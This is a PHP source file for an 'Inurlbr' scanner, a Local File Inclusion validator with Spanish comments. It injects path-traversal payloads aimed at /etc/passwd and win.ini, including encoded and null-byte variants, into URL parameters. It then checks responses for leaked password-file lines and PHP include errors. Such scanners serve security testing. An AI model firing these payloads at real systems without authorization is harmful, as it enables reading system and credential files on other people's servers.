<?php

declare(strict_types=1);

namespace Inurlbr\Validators;

use Inurlbr\Contracts\ValidatorInterface;
use InurlBr\Models\Vulnerability;
use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;
use Psr\Log\LoggerInterface;

/**
 * Validador de Local File Inclusion (LFI).
 * Detecta intentos de inclusión de archivos locales.
 */
class LfiValidator implements ValidatorInterface
{
    private Client $client;
    private LoggerInterface $logger;
    
    private array $lfiSignatures = [
        'root:',
        'bin:',
        'daemon:',
        '/bin/bash',
        '/usr/bin/',
        'proc/self/',
        'fd/',
        'No such file',
        'Permission denied',
        'open_basedir',
        'failed to open stream',
        'include()',
        'require()',
    ];

    private array $lfiPayloads = [
        '../../../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '../../../../../../../etc/passwd%00',
        '..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
        '/etc/passwd',
        '../../../../../../windows/win.ini',
    ];

    public function __construct(Client $client, LoggerInterface $logger)
    {
        $this->client = $client;
        $this->logger = $logger;
    }

    public function validate(string $url): ?Vulnerability
    {
        foreach ($this->lfiPayloads as $payload) {
            $testUrl = $this->injectPayload($url, $payload);
            
            try {
                $response = $this->client->get($testUrl, [
                    'timeout' => 10,
                    'http_errors' => false,
                    // No seguir redirecciones para evitar loops
                    'allow_redirects' => false,
                ]);

                $content = (string) $response->getBody();
                
                if ($this->detectLfi($content)) {
                    $this->logger->info("LFI detectada en: {$testUrl}");
                    
                    return new Vulnerability(
                        url: $testUrl,
                        type: 'Local File Inclusion',
                        severity: 'HIGH',
                        evidence: $this->extractEvidence($content),
                        payload: $payload,
                        confidence: 80
                    );
                }
            } catch (RequestException $e) {
                $this->logger->warning("Error al validar LFI: " . $e->getMessage());
                continue;
            }
        }

        return null;
    }

    public function getType(): string
    {
        return 'Local File Inclusion';
    }

    /**
     * Inyecta un payload LFI en la URL.
     */
    private function injectPayload(string $url, string $payload): string
    {
        if (strpos($url, '?') !== false) {
            parse_str(parse_url($url, PHP_URL_QUERY) ?? '', $params);
            
            foreach ($params as $key => $value) {
                // Buscar parámetros que parezcan rutas o archivos
                if (preg_match('/(file|path|page|include|template|doc)/i', $key)) {
                    return str_replace(
                        "{$key}={$value}",
                        "{$key}=" . urlencode($payload),
                        $url
                    );
                }
                
                // Si es numérico o vacío, también probar
                if (is_numeric($value) || $value === '') {
                    return str_replace(
                        "{$key}={$value}",
                        "{$key}=" . urlencode($payload),
                        $url
                    );
                }
            }
            
            // Agregar parámetro genérico
            return $url . '&file=' . urlencode($payload);
        }
        
        return $url . '?file=' . urlencode($payload);
    }

    /**
     * Detecta indicadores de LFI en el contenido.
     */
    private function detectLfi(string $content): bool
    {
        // Contar cuántas firmas se encuentran
        $matches = 0;
        
        foreach ($this->lfiSignatures as $signature) {
            if (stripos($content, $signature) !== false) {
                $matches++;
            }
        }
        
        // Se requieren al menos 2 coincidencias para reducir falsos positivos
        return $matches >= 2;
    }

    /**
     * Extrae evidencia de LFI del contenido.
     */
    private function extractEvidence(string $content): string
    {
        $lines = explode("\n", strip_tags($content));
        $evidence = [];
        
        foreach ($lines as $line) {
            $line = trim($line);
            // Buscar líneas que parezcan entradas de /etc/passwd o errores
            if (preg_match('/^(root|bin|daemon|www-data):/', $line) || 
                stripos($line, 'failed to open stream') !== false ||
                stripos($line, 'open_basedir') !== false) {
                $evidence[] = substr($line, 0, 150);
                
                if (count($evidence) >= 3) {
                    break;
                }
            }
        }
        
        return !empty($evidence) ? implode(' | ', $evidence) : 'LFI pattern detected';
    }
}
